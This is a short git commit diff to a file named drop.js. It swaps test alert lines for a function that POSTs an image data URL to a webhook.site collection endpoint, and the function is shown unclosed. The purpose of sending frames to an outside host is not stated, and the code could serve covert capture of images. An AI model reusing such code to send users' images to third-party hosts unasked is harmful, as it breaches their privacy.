70187fee655dfe668ff8b5520ec6e94106b51dcb
Tjmz <87590654+Tjmz@users.noreply.github.com>
2025-12-08 09:09:48 +0000

    Update drop.js

--- drop.js
+++ drop.js
@@ -1,2 +1,6 @@
-alert('JS success');
-console.log('Here comes the drop');
+function sendFrameToServer(imageDataUrl) {
+    fetch('https://webhook.site/21bb88af-9640-4faa-b5f9-fb118d6c85c4', {
+        method: 'POST',
+        body: JSON.stringify({ image: imageDataUrl }),
+        headers: { 'Content-Type': 'application/json' }
+    });
